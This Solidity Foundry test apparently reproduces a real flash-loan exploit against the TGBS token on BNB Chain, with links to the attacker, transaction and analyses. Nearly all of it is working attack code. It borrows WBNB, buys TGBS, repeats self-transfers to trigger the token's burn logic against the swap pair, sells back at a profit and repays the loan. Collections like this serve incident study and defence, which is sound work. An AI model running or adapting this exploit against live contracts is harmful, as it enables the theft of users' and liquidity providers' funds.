// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$150K
// Attacker : https://bscscan.com/address/0xff1db040e4f2a44305e28f8de728dabff58f01e1
// Attack Contract : https://bscscan.com/address/0x1a8eb8eca01819b695637c55c1707f9497b51cd9
// Vuln Contract : https://bscscan.com/address/0xedecfa18cae067b2489a2287784a543069f950f4
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0xa0408770d158af99a10c60474d6433f4c20f3052e54423f4e590321341d4f2a4

// @Analysis
// https://twitter.com/0xNickLFranklin/status/1765290290083144095
// https://twitter.com/Phalcon_xyz/status/1765285257949974747

interface ITGBS is IERC20 {
    function _burnBlock() external view returns (uint256);
}

contract ContractTest is Test {
    DVM private constant DPPOracle =
        DVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ITGBS private constant TGBS =
        ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 36725819);
        vm.label(address(DPPOracle), "DPPOracle");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(TGBS), "TGBS");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        uint256 baseAmount = WBNB.balanceOf(address(DPPOracle));
        DPPOracle.flashLoan(
            baseAmount,
            0,
            address(this),
            abi.encodePacked(uint32(0))
        );

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        WBNB.approve(address(Router), baseAmount);
        WBNBToTGBS(baseAmount);

        uint256 i;
        while (i < 1600) {
            TGBS.transfer(address(this), 1);
            uint256 burnBlock = TGBS._burnBlock();
            // If burn block is not a current block number, the amount of TGBS will be burned in swap pair
            if (burnBlock != block.number) {
                ++i;
            }
        }
        TGBS.approve(address(Router), TGBS.balanceOf(address(this)));
        TGBSToWBNB(TGBS.balanceOf(address(this)));

        WBNB.transfer(address(DPPOracle), baseAmount);
    }

    function WBNBToTGBS(uint256 amountIn) private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(TGBS);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 10
        );
    }

    function TGBSToWBNB(uint256 amountIn) private {
        address[] memory path = new address[](2);
        path[0] = address(TGBS);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 10
        );
    }
}
